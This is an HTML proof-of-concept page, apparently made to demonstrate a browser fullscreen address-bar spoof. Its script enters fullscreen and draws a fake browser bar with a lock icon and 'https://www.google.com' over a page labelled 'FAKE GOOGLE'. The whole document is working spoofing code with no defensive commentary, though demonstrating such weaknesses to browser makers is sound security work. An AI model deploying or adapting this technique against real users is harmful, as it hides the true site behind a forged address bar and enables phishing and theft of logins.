<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC A - Fullscreen Spoof</title>
</head>
<body>

<h2>Fullscreen Address Bar Spoof</h2>
<button onclick="run()">Run</button>

<script>
const TARGET = "https://www.google.com";

function fakeBar() {
  return `
  <div style="position:fixed;top:0;left:0;right:0;height:60px;background:#202124;color:#fff;display:flex;align-items:center;padding:0 16px;font-family:sans-serif;z-index:9999;">
    🔒 ${TARGET}
  </div>`;
}

function run() {
  document.documentElement.requestFullscreen().then(() => {
    document.body.innerHTML =
      fakeBar() +
      `<div style="padding-top:80px;text-align:center;">
        <h1>FAKE GOOGLE</h1>
      </div>`;
  });
}
</script>

</body>
